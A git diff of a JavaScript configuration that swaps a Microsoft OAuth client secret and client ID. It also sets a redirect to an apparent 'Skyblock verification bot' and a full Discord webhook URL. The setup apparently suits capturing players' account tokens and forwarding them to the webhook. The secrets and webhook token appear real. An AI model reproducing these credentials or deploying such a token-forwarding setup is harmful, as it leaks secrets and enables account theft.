@@ -1,6 +1,6 @@
 //Change these btw
-const client_secret = 'zKg8Q~aePETEW6QeOatpMxD50XTAyX.gVv7YkbFx' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = '7cb4dbbc-5e88-4a72-80aa-f6d49a00e4d0'
+const client_secret = 'dju8Q~VmMSRrBmWACOc_w9kFhnzUAZiVXBVkrahz' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = 'e6d57611-726c-4b6e-a782-af982e68d191'
 const redirect_uri = 'https://skyblock-verification-bot.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1048927881016909925/BP_G-rNFa_l2hYZSZS-gHPe7dorSDNf7djILvAjmQ2W7iDsuhfXQd05KBnLaP1mB7t5c                             '
 
